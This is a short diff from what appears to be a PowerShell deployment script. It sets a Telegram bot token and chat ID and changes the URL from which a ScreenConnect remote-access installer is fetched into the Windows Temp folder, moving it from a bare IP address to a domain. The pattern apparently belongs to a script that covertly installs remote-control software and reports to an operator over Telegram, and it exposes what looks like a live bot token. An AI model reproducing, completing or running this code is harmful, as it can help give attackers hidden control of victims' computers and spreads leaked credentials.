@@ -12,7 +12,7 @@ $BotToken = "8804791627:AAG1vTmc-HlAW8DR0gzKezeKidm4W3DwmXY"
 $ChatID   = "6867549905"
 
 # 2. APPLICATION CONFIGURATION
-$MsiUrl    = "http://50.114.179.239/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+$MsiUrl    = "https://stilesprocess.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 $TempDir   = "C:\Windows\Temp"
 $MsiPath   = Join-Path $TempDir "ScreenConnectSetup.msi"
 $LogPath   = "C:\Windows\Temp\ScreenConnect_Install.log"
